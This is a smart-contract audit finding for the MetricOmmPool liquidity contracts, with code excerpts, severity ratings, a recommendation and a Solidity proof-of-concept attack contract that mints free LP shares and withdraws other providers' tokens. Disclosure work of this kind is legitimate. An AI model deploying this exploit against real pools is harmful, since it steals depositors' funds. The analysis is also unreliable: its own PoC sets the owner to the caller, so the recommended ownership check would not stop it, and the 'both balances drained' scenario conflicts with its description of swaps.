### Title
Free LP Share Minting in Drained Bins via Missing `msg.sender == owner` Guard in `addLiquidity` — (File: `metric-core/contracts/MetricOmmPool.sol`, `metric-core/contracts/libraries/LiquidityLib.sol`)

---

### Summary

`MetricOmmPool.addLiquidity` accepts an arbitrary `owner` address without verifying `msg.sender == owner`. When a bin has been fully traversed by a swap (both `token0BalanceScaled` and `token1BalanceScaled` equal zero) but still carries non-zero `binTotalShares`, the proportional share-price formula produces `amount0Scaled = 0` and `amount1Scaled = 0`. Because the callback is gated on `amount0Added > 0 || amount1Added > 0`, no token payment is required and no `metricOmmModifyLiquidityCallback` is invoked. An attacker can therefore mint an arbitrarily large number of LP shares in a drained bin at zero cost, diluting every existing LP's proportional claim and stealing their tokens when the bin is subsequently refilled by swaps or new deposits.

---

### Finding Description

`removeLiquidity` correctly enforces the caller-equals-owner invariant:

```solidity
// MetricOmmPool.sol line 206
if (msg.sender != owner) revert NotPositionOwner();
```

`addLiquidity` has no equivalent guard:

```solidity
// MetricOmmPool.sol lines 182-196
function addLiquidity(
    address owner,          // ← fully attacker-controlled
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (...) {
    ...
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
        _liquidityContext(), owner, salt, deltas, callbackData, ...
    );
}
```

Inside `LiquidityLib.addLiquidity`, when `binTotalSharesVal > 0` the proportional formula is used:

```solidity
// LiquidityLib.sol lines 109-110
amount0Scaled = Math.ceilDiv(_checkedMul(binState.token0BalanceScaled, sharesToAdd), binTotalSharesVal);
amount1Scaled = Math.ceilDiv(_checkedMul(binState.token1BalanceScaled, sharesToAdd), binTotalSharesVal);
```

If both `token0BalanceScaled` and `token1BalanceScaled` are zero (a fully drained bin), both results are zero regardless of `sharesToAdd`. The callback block is then skipped entirely:

```solidity
// LiquidityLib.sol lines 144-155
if (amount0Added > 0 || amount1Added > 0) {
    ...
    IMetricOmmModifyLiquidityCallback(msg.sender)
        .metricOmmModifyLiquidityCallback(amount0Added, amount1Added, callbackData);
    ...
}
```

Shares are still written to the attacker's position and `binTotalShares` is still incremented:

```solidity
// LiquidityLib.sol lines 120-121
binTotalShares[binIdx] = binTotalSharesVal + sharesToAdd;
positionBinShares[posKey] = newUserShares;
```

The position key is `keccak256(abi.encode(owner, salt, binIdx))`, so the attacker sets `owner = attacker` and receives the shares. Because `removeLiquidity` only requires `msg.sender == owner`, the attacker can later withdraw their proportional share of any tokens that subsequently enter the bin.

---

### Impact Explanation

**Direct loss of LP principal — High severity.**

After the attacker mints a large share count for free, every token that enters the drained bin (via a reverse swap or a new LP deposit) is split proportionally across all shares, including the attacker's. Existing LPs receive a fraction of what they are owed; the remainder is extractable by the attacker via `removeLiquidity`. The loss scales with the ratio `attacker_shares / (original_shares + attacker_shares)` and is bounded only by the value that subsequently flows through the bin.

---

### Likelihood Explanation

**Medium-High.** Bins are routinely drained to zero during normal swap activity (a bin above the current price holds only token0; a full !zeroForOne traversal sets `token0BalanceScaled = 0` while `token1BalanceScaled` was already 0). The attack requires no special privilege, no malicious token, and no trusted role — only the ability to call `addLiquidity` directly on the pool (bypassing the periphery). The attacker can monitor on-chain state for drained bins and act in the same block.

---

### Recommendation

**Short term:** Add the same ownership check to `addLiquidity` that already exists in `removeLiquidity`:

```solidity
// MetricOmmPool.addLiquidity — add before LiquidityLib call
if (msg.sender != owner) revert NotPositionOwner();
```

If the protocol intentionally allows third-party deposits on behalf of another address (e.g., for the `MetricOmmPoolLiquidityAdder` periphery), introduce an explicit allowance or approval mechanism (analogous to ERC-20 `approve`/`transferFrom`) rather than leaving the `owner` field unconstrained.

**Long term:** Add an invariant test asserting that `addLiquidity` with `owner != msg.sender` reverts when called directly on the pool, and add a fuzz test that verifies no shares can be minted without a corresponding token transfer (i.e., `amount0Added + amount1Added > 0` whenever `sharesToAdd > 0` and the bin is non-empty).

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "metric-core/contracts/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {LiquidityDelta} from "metric-core/contracts/types/PoolOperation.sol";

contract FreeShareMintAttack {
    IMetricOmmPoolActions pool;

    constructor(address _pool) {
        pool = IMetricOmmPoolActions(_pool);
    }

    /// @notice Step 1: wait until bin `drainedBin` has both token balances == 0
    ///         but binTotalShares[drainedBin] > 0 (existing LPs have not withdrawn).
    /// @notice Step 2: call this function — no tokens are transferred.
    function mintFreeShares(int256 drainedBin, uint256 hugeSharesToMint) external {
        int256[] memory bins = new int256[](1);
        bins[0] = drainedBin;
        uint256[] memory shares = new uint256[](1);
        shares[0] = hugeSharesToMint;

        LiquidityDelta memory delta = LiquidityDelta({binIdxs: bins, shares: shares});

        // owner = address(this); no msg.sender == owner check in addLiquidity.
        // amount0Added == 0, amount1Added == 0 → callback never called → no payment.
        pool.addLiquidity(address(this), 0, delta, "", "");
        // attacker now holds hugeSharesToMint shares at zero cost.
    }

    /// @notice Step 3: after the bin is refilled by swaps or new LP deposits,
    ///         withdraw the stolen proportion.
    function extractTokens(int256 bin, uint256 sharesToBurn) external {
        int256[] memory bins = new int256[](1);
        bins[0] = bin;
        uint256[] memory shares = new uint256[](1);
        shares[0] = sharesToBurn;

        LiquidityDelta memory delta = LiquidityDelta({binIdxs: bins, shares: shares});
        // removeLiquidity requires msg.sender == owner; attacker IS the owner.
        pool.removeLiquidity(address(this), 0, delta, "");
    }
}
```
